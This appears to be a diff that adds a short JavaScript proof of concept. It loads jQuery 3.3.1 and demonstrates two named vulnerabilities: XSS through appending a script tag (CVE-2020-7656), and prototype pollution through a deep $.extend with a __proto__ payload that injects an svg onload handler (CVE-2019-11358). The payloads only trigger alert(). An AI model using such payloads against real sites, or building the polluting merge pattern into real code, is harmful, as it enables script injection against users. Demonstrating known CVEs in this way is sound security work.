@@ -1,0 +1,14 @@
+// Load vulnerable jQuery version
+const script = document.createElement('script');
+script.src = "https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js";
+document.head.appendChild(script);
+script.onload = function() {
+   // XSS via improper script handling (CVE-2020-7656)
+   const maliciousContent = "<script>alert('XSS via CVE-2020-7656')</script>";
+   $('body').append(maliciousContent);
+   // Prototype Pollution leading to XSS (CVE-2019-11358)
+   const defaultConfig = { "safeLink": "<a href='#'>Safe</a>" };
+   const maliciousParams = { "__proto__": { "safeLink": "<svg onload=alert('XSS via Prototype Pollution')>" } };
+   const config = $.extend(true, defaultConfig, maliciousParams);
+   $('#container').html(config.safeLink);
+};
